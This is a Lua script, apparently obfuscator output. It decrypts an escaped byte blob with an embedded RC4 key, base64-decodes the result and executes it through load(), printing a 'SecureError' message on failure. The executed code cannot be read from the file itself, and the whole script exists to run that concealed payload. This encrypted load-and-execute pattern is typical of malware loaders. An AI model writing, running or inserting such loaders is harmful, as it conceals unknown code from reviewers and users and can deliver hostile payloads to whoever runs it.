local NbF0Yzx8 = "\137\027\013\217\193\126\017\253\198\019\082\051\040\054\103\163\191\125\112\177\167\048\168\009\142\062\040\167\124\096\083\242\002\255\137\088\157\144\041\029\042\192\064\138\123\181\014\116\156\179\090\191\128\186\010\228\130\221\091\083\197\240\079\045\160\072\092\023\054\227\224\111\036\100\182\022\124\105\063\224\110\204\003\018\248\010\091\005\232\016\102\149\134\218\107\249\166\122\229\154\000\081\118\253\156\045\044\129\004\184\029\201\157\098\117\248\166\012\035\076\022\103\164\148\183\149\080\157\219\196\145\218\245\003\150\230\135\072\248\109\150\233\125\111\255\166\077\191\003\145\168\083\068\240\049\143\165\058\044\094"
local TB9b7l13 = "ueaMsxc2bOoqS7XV"
local function zKvHV9Uk(a,b) local p,c=1,0; while a>0 and b>0 do local ra,rb=a%2,b%2; if ra~=rb then c=c+p end; a,b,p=(a-ra)/2,(b-rb)/2,p*2; end; if a<b then a=b end; while a>0 do local ra=a%2; if ra>0 then c=c+p end; a,p=(a-ra)/2,p*2; end; return c; end
local function X5AYIk4V(d,k)
    local s = {} for i=0,255 do s[i]=i end
    local j=0
    for i=0,255 do
        j=(j+s[i]+string.byte(k,(i%#k)+1))%256
        s[i],s[j]=s[j],s[i]
    end
    local i,out = 0,{}
    j=0
    for idx=1,#d do
        i=(i+1)%256
        j=(j+s[i])%256
        s[i],s[j]=s[j],s[i]
        out[#out+1]=string.char(zKvHV9Uk(string.byte(d,idx),s[(s[i]+s[j])%256]))
    end
    return table.concat(out)
end
local function jhLmlQgK(data)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d%d%d%d%d%d', function(x)
        local r=0
        for i=1,8 do r=r+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(r)
    end))
end
local ok, err = pcall(function()
    local res = X5AYIk4V(NbF0Yzx8, TB9b7l13)
    assert(load(jhLmlQgK(res)))()
end)
if not ok then print("SecureError: "..tostring(err)) end